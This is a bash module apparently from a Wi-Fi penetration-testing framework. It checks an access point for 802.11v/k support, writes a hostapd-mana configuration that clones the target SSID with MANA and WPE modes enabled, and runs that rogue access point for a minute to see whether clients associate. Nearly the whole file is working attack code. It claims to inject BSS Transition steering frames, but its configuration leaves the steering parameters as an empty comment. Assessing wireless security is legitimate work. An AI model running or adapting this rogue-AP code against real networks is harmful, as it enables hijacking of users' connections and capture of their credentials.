#!/usr/bin/env bash
# MODULE_META
# NAME="BSS Transition Roaming Attack"
# CATEGORY="G"
# DEPS="A1,F1"
# CRITICAL="yes"
# TOOLS="tcpdump,tshark,hostapd-mana"
# DESC="Exploit 802.11v BTM frames to force clients to roam to rogue AP"
# REQS="monitor_iface,target_ssid,target_bssid,target_channel"
# PCAP="no"
# DECODE="none"

#===============================================================================
#  modules/g5_bss_transition_attack.sh
#  G5: BSS Transition Roaming Attack (802.11v)
#
#  PURPOSE:
#    Test if clients can be silently "steered" from the legitimate AP to a 
#    rogue AP using 802.11v BSS Transition Management (BTM) frames.
#    This is a quieter alternative to deauthentication.
#===============================================================================

run_g5() {
    set -uo pipefail
    
    local mon_iface="${MONITOR_INTERFACE:-}"
    local ap_iface="${WIFI_INTERFACE:-wlan0}"
    local target_ssid="${GUEST_SSID:-}"
    local target_bssid="${GUEST_BSSID:-}"
    local evidence_dir="${SESSION_EVIDENCE_DIR:-}"

    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --monitor-interface) mon_iface="$2"; shift 2 ;;
            --managed-interface) ap_iface="$2"; shift 2 ;;
            --target-ssid) target_ssid="$2"; shift 2 ;;
            --target-bssid) target_bssid="$2"; shift 2 ;;
            --evidence-dir) evidence_dir="$2"; shift 2 ;;
            *) shift ;;
        esac
    done

    local total_steps=5
    local evidence_prefix="${evidence_dir}/g5"
    
    log_step 1 $total_steps "Detecting 802.11v/k Support"
    update_tc_progress 1 $total_steps "Detection"

    check_module_dependencies "G5" || return 1

    check_abort || return 1

    if [[ -z "$target_ssid" ]]; then
        log_error "Target SSID not set. Run A1 first."; return 1
    fi

    # Verify if the AP advertises 802.11v (BSS Transition)
    if [[ -z "$mon_iface" ]]; then
        enable_monitor_mode || return 1
        mon_iface="${MONITOR_INTERFACE}"
    fi
    
    local beacon_file="${TMP_DIR:-/tmp}/g5_check.pcap"
    
    log_info "Analyzing beacons for 802.11v/k capabilities..."
    run_fg --quiet tcpdump -i "$mon_iface" -c 20 -w "$beacon_file" "type mgt subtype beacon and ether src ${target_bssid}" || true
    
    local dot11v_supported="false"
    if [[ -f "$beacon_file" ]]; then
        ensure_user_ownership "$beacon_file"
        # Check for Wireless Management capability bit (802.11v)
        if run_as_user tshark -r "$beacon_file" -Y "wlan.mgt.fixed.capabilities.radio_measurement == 1" 2>/dev/null | grep -q "."; then
            dot11v_supported="true"
            log_success "802.11v/k (Radio Measurement) support detected in AP beacons."
        fi
        rm -f "$beacon_file"
    fi

    log_step 2 $total_steps "Preparing Roaming Rogue AP"
    update_tc_progress 2 $total_steps "Setup"

    check_abort || return 1

    # This attack requires hostapd-mana for BTM frame injection
    if [[ ! -x "${TOOL_PATHS[hostapd-mana]:-}" ]] && ! command -v hostapd-mana &>/dev/null; then
        log_error "hostapd-mana is required for BSS Transition attacks."
        return 1
    fi

    local mana_conf="${evidence_dir}/g5_mana.conf"
    
    cat <<EOF > "$mana_conf"
interface=${ap_iface}
driver=nl80211
ssid=${target_ssid}
hw_mode=g
channel=1
# Enable MANA steering and BTM
mana_wpe=1
mana_loud=1
# BTM Steering parameters
EOF

    log_step 3 $total_steps "Initiating Steering Attack"
    update_tc_progress 3 $total_steps "Steering"

    check_abort || return 1

    log_info "Deploying Rogue AP and sending BTM steering frames..."
    # Start hostapd-mana with steering enabled
    spawn_bg "g5_mana" "hostapd-mana" --log "${evidence_prefix}_mana.log" "$mana_conf"

    start_countdown 60 "Monitoring for silent client roaming"
    sleep 60
    stop_countdown
    stop_process "g5_mana"

    log_step 4 $total_steps "Verifying Roam Status"
    local roam_detected="false"
    if grep -qi "associated" "${evidence_prefix}_mana.log" 2>/dev/null; then
        roam_detected="true"
        log_result "CRITICAL" "BSS Transition Roam SUCCESSFUL: Client silently moved to Rogue AP!"
    fi

    log_step 5 $total_steps "Saving Results"
    local result_status="SECURE"
    [[ "$roam_detected" == "true" ]] && result_status="VULNERABLE"
    
    local result_json=$(run_fg jq -n \
        --arg status "$result_status" \
        --arg summary "BSS Transition Attack: ${result_status}" \
        --arg details "802.11v detected: ${dot11v_supported}, Client Roamed: ${roam_detected}" \
        '{
            status: $status,
            summary: $summary,
            details: $details
        }')
    
    save_tc_result "G5" "$result_json" 1 1 1 1 1 1 0 1 1 1 0
    save_session_state
    return 0
}
